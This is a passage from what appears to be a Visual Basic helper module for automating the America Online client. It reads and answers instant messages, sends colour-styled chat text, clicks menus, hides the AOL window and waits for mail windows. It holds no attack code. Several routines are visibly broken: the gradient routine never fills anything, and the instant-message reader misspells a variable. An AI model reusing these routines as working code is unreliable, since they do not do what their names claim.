IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(IM%)
TheSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = TheSN$

End Function

Sub Playwav(File)
SoundName$ = File
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   X% = sndPlaySound(SoundName$, wFlags%)

End Sub

Sub KillModal()
Modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_CLOSE, 0, 0)
End Sub




Sub CenterForm(F As Form)
F.Top = (Screen.Height * 0.85) / 2 - F.Height / 2
F.Left = Screen.Width / 2 - F.Width / 2
End Sub
Sub RespondIM(message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(IM%, "RICHCNTL")

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)


e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e2, GW_HWNDNEXT)
Call SendMessageByString(e2, WM_SETTEXT, 0, message)
Click (e)
Call TimeOut(0.8)
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
e = FindChildByClass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)

Click (e)
End Sub

Public Sub StopMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("stop " & MIDIFile$, 0&, 0, 0)
    End If
End Sub
Function MessageFromIM()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

IM% = FindChildByTitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = FindChildByTitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMText% = FindChildByClass(IM%, "RICHCNTL")
IMmessage = GetText(IMText%)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(blah, Len(blah) - 1)
End Function

Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub

Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For GetString = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next GetString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub


Sub Upchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(AOL%, 1)
Call EnableWindow(Upp%, 0)
End Sub
Sub UnUpchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(AOL%, 0)
End Sub

Sub HideAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 0)
End Sub

Sub ShowAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 5)
End Sub
Public Sub killwin(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Function TrimNull(tstr As Variant) As Variant
   Init = InStr(tstr, Chr(0))
   If Init Then
      TrimNull = Mid(tstr, 1, Init - 1)
   Else
      TrimNull = tstr
   End If
End Function
Function AOLGetUser()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
user = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOLGetUser = user
End Function
Function AOLGetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)

AOLGetText = TrimSpace$
End Function
Function ParaLeft()
   ParaLeft = "‹^›(··) "
End Function



Sub GradientB(TheForm As Form)
    Dim hBrush%
    Dim FormHeight%, red%, StepInterval%, X%, retVal%, OldMode%
    Dim FillArea As RECT
    OldMode = TheForm.ScaleMode
    TheForm.ScaleMode = 3  'Pixel
    FormHeight = TheForm.ScaleHeight
' Divide the form into 63 regions
    StepInterval = FormHeight \ 63
    red = 255
    Green = 0
    Blue = 0
    FillArea.Left = 0
    FillArea.Right = TheForm.ScaleWidth
    FillArea.Top = 0
    FillArea.bottom = StepInterval
    For X = 1 To 63
               FillArea.Top = FillArea.bottom
        FillArea.bottom = FillArea.bottom + StepInterval
    Next
' Fill the remainder of the form with black
    FillArea.bottom = FillArea.bottom + 63
    
    TheForm.ScaleMode = OldMode
End Sub
Sub hit_menu(mnu_str$)
AOL% = FindWindow("AOL Frame25", 0&)
mnu% = GetMenu(AOL%)
MNU_Count% = GetMenuItemCount(mnu%)
For Top_Level% = 0 To MNU_Count% - 1
    Sub_Mnu% = GetSubMenu(mnu%, Top_Level%)
    Sub_Count% = GetMenuItemCount(Sub_Mnu%)
    For Sub_level% = 0 To Sub_Count% - 1
        Buff$ = Space$(50)
        junk% = GetMenuString(Sub_Mnu%, Sub_level%, Buff$, 50, MF_BYPOSITION)  'As Integer
        Buff$ = Trim$(Buff$): Buff$ = Left(Buff$, Len(Buff$) - 1)
        If Buff$ = "" Then Buff$ = " -"
        If InStr(Buff$, mnu_str$) Then
            Mnu_ID% = GetMenuItemID(Sub_Mnu%, Sub_level%)
            junk% = SendMessageByNum(AOL%, WM_COMMAND, Mnu_ID%, 0)
        End If
    Next Sub_level%
Next Top_Level%
End Sub
Sub Click(Button%)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub
               


Sub WavYChaTGreenBlack(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    L$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#00ff00" & Chr$(34) & "><sup>" & L$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#008000" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#008000" & Chr$(34) & ">" & T$
Next W
SendChat (p$)
End Sub
Function WavyChatBlueBlack(TheText As String)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    L$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#0000ff" & Chr$(34) & "><sup>" & L$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#000080" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#000080" & Chr$(34) & ">" & T$
Next W
SendChat (p$)
End Function
Function WavYChaTRedBlack(TheText As String)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    L$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sup>" & L$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#800000" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#000000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#800000" & Chr$(34) & ">" & T$
Next W
SendChat (p$)
End Function
Function WavYChaTGrayPurple(TheText As String)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    L$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<B><FONT COLOR=" & Chr$(34) & "#c0c0c0" & Chr$(34) & "><sup>" & L$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#ff00ff" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#800080" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#ff00ff" & Chr$(34) & ">" & T$
Next W
SendChat (p$)
End Function
Sub SetPreference()
30:
   DoEvents
   Preferences% = FindChildByTitle(AOLMDI(), "Preferences")
   If Preferences% = 0 Then GoTo 30
40:
   Preferences% = FindChildByTitle(AOLMDI(), "Preferences")
   C = FindChildByTitle(Preferences%, "Mail")
   Button% = GetWindow(C, 2)
   Call Click(Button%)
   DoEvents
   Pause 0.5
   a = FindWindow("_AOL_MODAL", vbNullString)
   If a = 0 Then GoTo 40
   b = FindChildByTitle(a, "close")
   C = GetWindow(b, 3)
   whocares = SendMessage(C, BM_SETCHECK, 0, 0)
   D = FindChildByTitle(a, "confirm")
   e = GetWindow(D, 2)
   whocares = SendMessage(e, BM_SETCHECK, 1, 0)
400:
   a = FindWindow("_AOL_MODAL", vbNullString)
   Button% = FindChildByTitle(a, "OK")
   Call Click(Button%)
   DoEvents
   Pause 0.5
   a = FindWindow("_AOL_MODAL", vbNullString)
   If a Then GoTo 400
4000:
   whocares = SendMessage(Preferences%, WM_CLOSE, 0, 0)
   Preferences% = FindChildByTitle(AOLMDI(), "Preferences")
   Pause 0.5
   DoEvents
   DoEvents
   If Preferences% Then GoTo 4000
End Sub
Function WaitForMailWnd(mailwin As Variant)
15:
   DoEvents
   MDI% = AOLMDI()
   Mail% = FindChildByTitle(MDI%, mailwin)
   Tree% = FindChildByClass(Mail%, "_AOL_TREE")
   okbut% = FindWindow("#32770", "America Online")
   Button% = FindChildByTitle(okbut%, "OK")
   nextwin% = GetWindow(Button%, 1)
   TheString$ = String(255, 0)
   whocares = SendMessageByString(nextwin%, WM_GETTEXT, 255, TheString$)
   nullinstring = InStr(TheString$, Chr(0))
   If nullinstring Then
      valofret = Mid(TheString$, 1, nullinstring - 1)
   Else
      valofret = TheString$
   End If
   NextString = Mid(TheString$, 1, 11)
   If NextString = "You have no" Then
      Call Click(Button%)
      MsgBox "You have no " + p0C0C + "!", 16
      WaitForMailWnd = 1
      Exit Function
   End If
   If Tree% = 0 Then GoTo 15
   Do Until 2 > 3
      Pwait.Label1.Caption = "Waiting for " + mailwin + " to load up..."
      whocares3 = SendMessage(Tree%, LB_GETCOUNT, 0, 0)
      DoEvents
      Pause 2
      whocares4 = SendMessage(Tree%, LB_GETCOUNT, 0, 0)
      DoEvents
      If whocares3 = whocares4 Then Exit Do
   Loop
   Pwait.Label1.Caption = "Please Wait, Creating Mail List..."
End Function
Function AOLLastChatLine()
getpar% = FindChatRoom()
If getpar% = 0 Then Exit Function
child = FindChildByClass(getpar%, "_AOL_View")
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)

TheView$ = TrimSpace$


For FindChar = 1 To Len(TheView$)
thechar$ = Mid(TheView$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
thechatext$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
LastLine = Mid(TheView$, lastlen + 1, Len(thechars$) - 1)
AOLLastChatLine = LastLine
End Function
Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function
Function FindSendWin(dosloop)
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function


